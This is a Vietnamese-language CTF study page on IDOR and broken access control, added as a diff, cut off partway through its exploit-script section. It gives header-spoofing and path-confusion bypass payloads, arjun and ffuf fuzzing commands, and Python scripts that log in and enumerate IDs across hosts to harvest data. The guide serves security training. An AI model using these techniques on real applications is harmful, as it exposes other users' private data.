@@ -1,0 +1,568 @@
+<title>IDOR &amp; Broken Access Control — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Access Control &amp; Business Logic</div>
+    <h1>IDOR &amp; Broken Access Control</h1>
+    <p class="sub">Khi trang web kiểm tra "bạn đã đăng nhập chưa" nhưng QUÊN kiểm tra "dữ liệu/chức năng này có
+    đúng là của bạn không" — bạn chỉ cần <strong>đổi một con số hoặc một ID trong URL</strong> là xem được dữ
+    liệu của người khác, hoặc gọi được chức năng lẽ ra chỉ admin mới được dùng. Không cần payload gì đặc biệt —
+    đây là lỗ hổng <strong>dễ khai thác nhất</strong> một khi đã phát hiện.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>IDOR / Broken Access Control là gì, để làm gì?</h2>
+  <p class="lead">Rất nhiều chức năng web dùng ID để xác định "bản ghi nào" hoặc "trang nào": xem đơn hàng
+  <code>/order/482</code>, xem hồ sơ <code>/profile?user_id=17</code>, tải file <code>/document/9</code>. Server
+  có thể kiểm tra đúng "bạn đã đăng nhập" (authentication) nhưng <strong>quên kiểm tra</strong> "đơn hàng/hồ sơ/
+  file số 482 đó có đúng thuộc về bạn không" (authorization — phân quyền). Đây gọi là <strong>IDOR</strong>
+  (Insecure Direct Object Reference). Phiên bản rộng hơn — <strong>Broken Access Control</strong> — là khi bạn
+  gọi thẳng một chức năng/trang (vd <code>/admin</code>) mà server quên chặn với user thường.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn thử: <strong>đăng nhập bằng 2 tài khoản thường</strong> (user A, user B), lấy ID của tài khoản B (hoặc dữ
+  liệu của B), rồi dùng session của A để gọi đúng ID đó. Nếu A xem/sửa được dữ liệu của B ⟹ IDOR. Trong CTF,
+  flag thường nằm trong dữ liệu của 1 "nạn nhân" (user khác, hoặc record có ID đặc biệt).</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ IDOR / BROKEN ACCESS CONTROL</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        URL/API có ID lộ ra: <code>/api/user/123</code>, <code>?order_id=55</code>, <code>/invoice/8821.pdf</code>.
+        Đổi số thành ID khác (tăng/giảm 1, hoặc ID của user khác) → nếu xem/sửa được dữ liệu không phải của mình
+        ⟹ IDOR.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có ít nhất 1 tài khoản đăng nhập được (kể cả tài khoản tự đăng ký miễn phí). Biết hoặc đoán được ID của
+        "nạn nhân" — có thể chỉ cần thử ID nhỏ/liên tiếp.
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: lấy request của chính mình (vd <code>GET /api/user/17</code> — 17 là ID của mình), đổi thành
+        <code>16</code>, <code>18</code>, <code>1</code>... Send từng cái, so sánh Response.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># Duyệt tuần tự ID (IDOR cơ bản)</span>
+GET /api/user/1
+GET /api/user/2
+GET /api/user/3 ...
+
+<span class="c"># Đổi method để bỏ qua kiểm tra chỉ áp dụng cho 1 method</span>
+GET /admin/delete?id=5  -&gt;  POST /admin/delete  (body: id=5)
+
+<span class="c"># Thêm header giả để qua được check "chỉ cho phép nội bộ"</span>
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+s = requests.Session()
+s.post(<span class="s">"http://TARGET/login"</span>, data={<span class="s">"user"</span>:<span class="s">"me"</span>,<span class="s">"pass"</span>:<span class="s">"me123"</span>})
+<span class="k">for</span> uid <span class="k">in</span> range(1, 50):
+    r = s.get(<span class="s">f"http://TARGET/api/user/{uid}"</span>)
+    m = FLAG_RE.search(r.text)
+    <span class="k">if</span> m: <span class="k">print</span>(uid, m.group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        ID dạng số dễ đoán, nhưng ID dạng UUID (<code>a1b2c3d4-...</code>) gần như không đoán được — tìm cách
+        xem ID đó ở đâu khác lộ ra (danh sách công khai, API khác). WAF <strong>khó</strong> chặn IDOR bằng regex
+        vì payload trông y hệt request hợp lệ — phòng thủ đúng là sửa logic code (không thể qua WAF), nên mục 10
+        bài này sẽ nói kỹ hơn vì sao khác các bài trước.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Authentication (xác thực)</b> — kiểm tra "bạn là ai" (đăng nhập đúng mật khẩu, có cookie
+  session hợp lệ).</div>
+  <div class="def"><b>Authorization (phân quyền)</b> — kiểm tra "bạn được phép làm việc NÀY với dữ liệu NÀY
+  không", sau khi đã biết bạn là ai. <strong>IDOR là lỗi ở bước này</strong>, không phải ở bước xác thực — bạn
+  vẫn đăng nhập hợp lệ, chỉ là server quên kiểm tra quyền sở hữu dữ liệu.</div>
+  <div class="def"><b>Direct Object Reference</b> — khi hệ thống dùng trực tiếp 1 giá trị (ID số, tên file...) để
+  chỉ tới 1 bản ghi cụ thể trong request, thay vì giấu đi qua một lớp kiểm tra quyền.</div>
+  <p>Code hay viết (thiếu đúng 1 dòng kiểm tra quyền sở hữu):</p>
+  <pre><code><span class="c"># Python/Flask — chỉ kiểm tra ĐÃ ĐĂNG NHẬP, quên kiểm tra ĐÚNG CHỦ SỞ HỮU</span>
+<span class="nd">@app.route</span>(<span class="s">"/api/order/&lt;int:order_id&gt;"</span>)
+<span class="nd">@login_required</span>
+<span class="k">def</span> <span class="d">get_order</span>(order_id):
+    order = db.get_order(order_id)   <span class="c"># thiếu: if order.user_id != current_user.id: abort(403)</span>
+    <span class="k">return</span> jsonify(order)</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Lập trình viên nhầm "đăng nhập" với "có quyền"</h2>
+  <p><code>@login_required</code> chỉ đảm bảo request có <strong>một</strong> session hợp lệ nào đó — không đảm
+  bảo session đó <strong>có quyền</strong> với <code>order_id</code> cụ thể trong URL. Lập trình viên thường test
+  bằng chính tài khoản của mình (tự nhiên ID khớp), không nghĩ tới việc đổi ID sang của người khác — lỗi này
+  <strong>rất phổ biến</strong> vì nó không gây lỗi gì khi dùng bình thường, chỉ lộ ra khi có người cố tình đổi ID.</p>
+  <p>Đây cũng là lý do IDOR <strong>không cần "payload"</strong> như SQLi/XSS — bản chất là <strong>thiếu 1 dòng
+  code so sánh</strong>, không phải dữ liệu bị hiểu sai cú pháp. Khai thác chỉ đơn giản là đổi giá trị hợp lệ
+  thành một giá trị hợp lệ khác mà bạn không có quyền.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>So sánh: có check vs thiếu check quyền sở hữu</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 230" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .lbl-ok{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--ok);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .box-ok{fill:var(--ok-soft);stroke:var(--ok);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr7)}
+    </style>
+    <defs><marker id="arr7" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+
+    <text x="10" y="18" class="lbl-m">Đăng nhập là user A (id=17), xin xem order của user B (id=482):</text>
+
+    <rect x="10" y="30" width="300" height="45" rx="10" class="box-a"/>
+    <text x="22" y="48" class="lbl-m">A gửi: GET /api/order/482</text>
+    <text x="22" y="62" class="lbl-a">(session của A, id=17)</text>
+
+    <path d="M160,75 V95" class="arrow"/>
+    <rect x="10" y="100" width="300" height="55" rx="10" class="box"/>
+    <text x="22" y="118" class="lbl-m">Server CÓ check quyền:</text>
+    <text x="22" y="134" class="lbl">if order.user_id != 17: 403</text>
+    <text x="22" y="148" class="lbl-ok">-&gt; TỪ CHỐI (đúng)</text>
+
+    <rect x="370" y="30" width="300" height="45" rx="10" class="box-a"/>
+    <text x="382" y="48" class="lbl-m">A gửi: GET /api/order/482</text>
+    <text x="382" y="62" class="lbl-a">(session của A, id=17)</text>
+
+    <path d="M520,75 V95" class="arrow"/>
+    <rect x="370" y="100" width="300" height="55" rx="10" class="box-a"/>
+    <text x="382" y="118" class="lbl-m">Server THIẾU check quyền:</text>
+    <text x="382" y="134" class="lbl">chỉ check đã login, lấy thẳng order 482</text>
+    <text x="382" y="148" class="lbl-a">-&gt; LỘ DỮ LIỆU của B! (IDOR)</text>
+  </svg>
+  </div>
+  <p>Khác biệt duy nhất giữa 2 nhánh là đúng <strong>1 dòng code so sánh</strong>
+  (<code>order.user_id == current_user.id</code>). Đây là lý do IDOR khó rà soát bằng mắt khi đọc lướt code —
+  phải chủ động tìm đúng chỗ "lấy dữ liệu theo ID" rồi kiểm tra ngay bên dưới có dòng so sánh chủ sở hữu hay không.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>URL/API có số ID lộ ra: <code>/user/17</code>, <code>?id=55</code>, <code>/invoice/8821</code></td><td>Bề mặt IDOR cổ điển — thử đổi ID ngay</td></tr>
+    <tr><td>Có 2 vai trò (user thường / admin) nhưng chỉ phân biệt qua giao diện (menu ẩn), API vẫn y hệt</td><td>Broken Access Control — endpoint admin có thể gọi thẳng dù giao diện không hiện link</td></tr>
+    <tr><td>Response trả JSON có nhiều field hơn những gì hiển thị trên giao diện</td><td>Có thể lộ thông tin nhạy cảm của user khác ngay cả khi chỉ xem chính mình (xem field thừa)</td></tr>
+    <tr><td>Có file tải về dạng <code>/download/report_{id}.pdf</code></td><td>IDOR trên file, không chỉ API JSON</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — bắt request của chính mình, đổi ID</span>
+  <ol style="margin:4px 0 0">
+    <li>Đăng nhập tài khoản của bạn, thực hiện thao tác bình thường (xem đơn hàng của chính mình).</li>
+    <li>Burp bắt request, Send to Repeater.</li>
+    <li>Đổi ID trong URL/body sang ID khác, Send, so sánh Response (status code, nội dung).</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Khi nào cần Intruder — dò hàng loạt ID</span>
+  Đánh dấu <code>§id§</code>, nạp payload type <strong>Numbers</strong> (vd 1→100), Start attack, sắp xếp theo
+  cột <strong>Status</strong>/<strong>Length</strong> — ID nào trả về <code>200</code> với nội dung khác định
+  dạng lỗi chuẩn (thường các ID "không phải của bạn" sẽ bị 403/404 nếu đã vá, nhưng nếu dính IDOR thì toàn bộ ID
+  hợp lệ đều trả <code>200</code> với dữ liệu khác nhau).</div>
+  <div class="note burp"><span class="tag">Kỹ thuật riêng: so sánh 2 session song song</span>
+  Đăng nhập 2 tài khoản (2 tab trình duyệt/2 cookie khác nhau). Lấy request của tài khoản A, thử với
+  <strong>cookie của tài khoản B</strong> (đổi header <code>Cookie</code> trong Repeater) nhưng giữ nguyên ID
+  thuộc về A → nếu B xem được dữ liệu của A ⟹ IDOR xác nhận chắc chắn, không phải trùng hợp.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD & KỸ THUẬT ĐẦY ĐỦ</div>
+  <h2>Các dạng Broken Access Control thường gặp</h2>
+
+  <h3>A. IDOR cổ điển — đổi ID</h3>
+  <table>
+    <tr><th>Kỹ thuật</th><th>Ví dụ</th></tr>
+    <tr><td>Tăng/giảm số nguyên</td><td><code>/user/17</code> → thử <code>16</code>, <code>1</code>, <code>0</code></td></tr>
+    <tr><td>ID dạng chuỗi dễ đoán</td><td><code>user_0001</code> → thử <code>admin</code>, <code>user_0000</code></td></tr>
+    <tr><td>ID mã hóa yếu (base64 của số)</td><td><code>MTc=</code> giải ra <code>17</code> — thử encode lại số khác</td></tr>
+  </table>
+
+  <h3>B. Broken Access Control — bypass kiểm tra quyền trên route</h3>
+  <table>
+    <tr><th>Kỹ thuật</th><th>Ví dụ</th></tr>
+    <tr><td>Gọi thẳng endpoint ẩn</td><td><code>/admin</code>, <code>/admin/users</code>, <code>/api/admin/delete</code> dù giao diện không hiện link</td></tr>
+    <tr><td>Đổi method</td><td>Nếu <code>DELETE /api/user/5</code> bị chặn, thử <code>POST /api/user/5/delete</code> hoặc ngược lại</td></tr>
+    <tr><td>Thêm header giả vờ nội bộ</td><td><code>X-Forwarded-For: 127.0.0.1</code>, <code>X-Original-URL</code>, <code>X-Rewrite-URL</code> (một số reverse proxy tin các header này)</td></tr>
+    <tr><td>Path confusion</td><td><code>/admin/</code>, <code>/Admin</code>, <code>//admin</code>, <code>/admin/.</code>, <code>/admin%2e</code> — một số middleware check path khác cách web server thật sự route</td></tr>
+  </table>
+
+  <h3>C. Function-level access control (vai trò user thường gọi API chỉ dành admin)</h3>
+  <p>Khác B ở chỗ: route không "ẩn", bạn <strong>biết endpoint tồn tại</strong> (thấy trong code JS frontend hoặc
+  API docs) nhưng chỉ admin được phép gọi theo thiết kế — thử gọi thẳng bằng session user thường, xem app có check
+  role ở phía server hay chỉ ẩn nút ở giao diện.</p>
+
+  <h3>D. Dò tham số ẩn (khi IDOR không rõ ràng từ URL)</h3>
+  <p>Nhiều API nhận thêm tham số không hiện trên giao diện (vd <code>?debug=1</code>, <code>?admin=true</code>) —
+  dùng <strong>arjun</strong> (mục 07) để tự động dò thay vì đoán mò.</p>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: ARJUN, FFUF &amp; BURP AUTORIZE</div>
+  <h2>Không chắc có ID/tham số ẩn nào? Dùng công cụ dò</h2>
+
+  <h3>A. arjun — dò tham số HTTP ẩn tự động (đã cài sẵn)</h3>
+  <div class="def"><b>arjun</b> — công cụ tự động thử hàng nghìn tên tham số phổ biến lên 1 endpoint, báo lại
+  tham số nào server thực sự nhận ra (phản hồi khác đi), giúp tìm tham số kiểu <code>admin=true</code>,
+  <code>debug=1</code> mà bạn không thể đoán hết bằng tay.</div>
+  <pre><code>arjun -u <span class="s">"http://TARGET/api/user"</span> -m GET
+arjun -u <span class="s">"http://TARGET/api/order"</span> -m POST --headers <span class="s">"Cookie: session=..."</span></code></pre>
+
+  <h3>B. ffuf — dò ID/endpoint ẩn hàng loạt (đã cài sẵn)</h3>
+  <pre><code><span class="c"># Dò ID hợp lệ trong khoảng 1-1000, chỉ hiện status 200</span>
+ffuf -u <span class="s">"http://TARGET/api/user/FUZZ"</span> -w <span class="s">&lt;(seq 1 1000)</span> \
+     -H <span class="s">"Cookie: session=..."</span> -mc 200
+
+<span class="c"># Dò tên endpoint admin ẩn bằng wordlist có sẵn</span>
+ffuf -u <span class="s">"http://TARGET/FUZZ"</span> \
+     -w ~/hoc/CTF/Tools/web/SecLists/Discovery/Web-Content/raft-small-directories.txt \
+     -H <span class="s">"Cookie: session=..."</span></code></pre>
+
+  <h3>C. Burp Autorize (extension) — tự động hóa so sánh 2 session</h3>
+  <div class="def"><b>Autorize</b> — extension Burp (cài qua BApp Store khi còn Internet, <strong>phải cài
+  trước ngày thi</strong>): tự động lặp lại MỌI request bạn gửi bằng session của 1 tài khoản quyền thấp hơn, rồi
+  tự so sánh response — phát hiện Access Control lỗi hàng loạt mà không cần tự tay thử từng request.</div>
+  <div class="note warn"><span class="tag">Chưa xác nhận có cài offline</span>Đây là extension cần cài từ BApp
+  Store (cần Internet) — <strong>phải tải và cài trước ngày thi</strong> nếu muốn dùng, không thể tải giữa trận.
+  Nếu chưa kịp cài, kỹ thuật thủ công ở mục 05 (so sánh 2 session) vẫn làm được, chỉ chậm hơn.</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+s = requests.Session()
+s.post(<span class="s">"http://TARGET/login"</span>, data={<span class="s">"username"</span>: <span class="s">"myaccount"</span>, <span class="s">"password"</span>: <span class="s">"mypass123"</span>})
+
+<span class="c"># Bước 1: xem order của chính mình (giả sử id=17)</span>
+r = s.get(<span class="s">"http://TARGET/api/order/17"</span>)
+<span class="k">print</span>(r.json())
+
+<span class="c"># Bước 2: thử ID khác -- của "nạn nhân"</span>
+r = s.get(<span class="s">"http://TARGET/api/order/1"</span>)
+<span class="k">print</span>(r.json())   <span class="c"># nếu thấy dữ liệu khác, không phải của mình -> IDOR xác nhận</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — duyệt toàn bộ ID, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_idor</span>(host, max_id=100):
+    s = requests.Session()
+    s.post(<span class="s">f"http://{host}/login"</span>, data={<span class="s">"username"</span>: <span class="s">"myaccount"</span>, <span class="s">"password"</span>: <span class="s">"mypass123"</span>}, timeout=5)
+    <span class="k">for</span> uid <span class="k">in</span> range(1, max_id):
+        r = s.get(<span class="s">f"http://{host}/api/order/{uid}"</span>, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">if</span> m:
+            <span class="k">return</span> m.group()
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_idor(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_idor</span>(host, max_id=100):
+    <span class="k">try</span>:
+        s = requests.Session()
+        s.post(<span class="s">f"http://{host}/login"</span>, data={<span class="s">"username"</span>: <span class="s">"myaccount"</span>, <span class="s">"password"</span>: <span class="s">"mypass123"</span>}, timeout=5)
+        <span class="k">for</span> uid <span class="k">in</span> range(1, max_id):
+            r = s.get(<span class="s">f"http://{host}/api/order/{uid}"</span>, timeout=5)
+            m = FLAG_RE.search(r.text)
+            <span class="k">if</span> m:
+                <span class="k">return</span> m.group()
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">pass</span>
+    <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_idor(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Lưu ý quan trọng cho A/D</span>Script này cần <strong>tài khoản đăng
+  nhập được trên service của chính mình</strong> trước (giả định mọi đội có cùng cơ chế đăng ký/đăng nhập, cùng
